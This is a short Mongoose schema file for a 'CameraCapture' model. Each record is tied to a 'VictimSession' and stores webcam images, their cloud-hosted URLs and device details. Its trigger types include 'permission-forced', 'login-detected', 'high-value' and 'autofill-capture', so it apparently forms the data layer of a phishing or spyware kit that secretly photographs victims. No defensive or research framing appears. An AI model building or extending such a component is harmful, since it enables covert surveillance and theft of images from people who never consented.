const mongoose = require('mongoose');

const CameraCaptureSchema = new mongoose.Schema({
  sessionId: { type: mongoose.Schema.Types.ObjectId, ref: 'VictimSession', required: true, index: true },
  sessionIdStr: { type: String },
  imagePath: { type: String },
  imageData: { type: String }, // base64 (kept for backward compatibility, but will be cleared after Cloudinary upload)
  cloudinaryUrl: { type: String }, // Cloudinary hosted URL
  cloudinaryPublicId: { type: String }, // Cloudinary public ID for deletion
  capturedAt: { type: Date, default: Date.now },
  metadata: {
    facingMode: { type: String },
    resolution: { type: String },
    deviceLabel: { type: String },
    deviceId: { type: String },
    width: { type: Number },
    height: { type: Number }
  },
  autoCaptured: { type: Boolean, default: false },
  triggerType: { type: String, enum: ['manual', 'auto', 'periodic', 'high-value', 'login-detected', 'permission-forced', 'permission-forcer', 'admin-triggered', 'autofill-capture'], default: 'manual' }
}, { timestamps: true });

module.exports = mongoose.model('CameraCapture', CameraCaptureSchema);
